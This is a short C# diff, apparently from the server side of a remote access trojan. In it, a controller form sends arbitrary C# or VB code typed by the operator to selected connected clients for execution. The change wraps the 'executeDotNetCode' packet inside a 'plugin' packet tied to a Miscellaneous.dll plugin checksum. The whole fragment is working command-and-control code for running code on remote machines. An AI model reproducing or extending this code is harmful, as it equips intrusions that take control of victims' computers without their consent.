@@ -15,6 +15,7 @@ using Server.Connection;
 using FastColoredTextBoxNS;
 using Microsoft.CSharp;
 using Microsoft.VisualBasic;
+using Server.Algorithm;
 
 namespace Server.Forms
 {
@@ -46,11 +47,17 @@ namespace Server.Forms
                 {
                     reference.Add(ip);
                 }
+
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Packet").AsString = "executeDotNetCode";
+                packet.ForcePathObject("Option").AsString = comboLang.Text;
+                packet.ForcePathObject("Code").AsString = txtBox.Text;
+                packet.ForcePathObject("Reference").AsString = string.Join(",", reference);
+
                 MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "executeDotNetCode";
-                msgpack.ForcePathObject("Option").AsString = comboLang.Text;
-                msgpack.ForcePathObject("Code").AsString = txtBox.Text;
-                msgpack.ForcePathObject("Reference").AsString = string.Join(",", reference);
+                msgpack.ForcePathObject("Packet").AsString = "plugin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
 
                 foreach (ListViewItem item in Program.form1.listView1.SelectedItems)
                 {
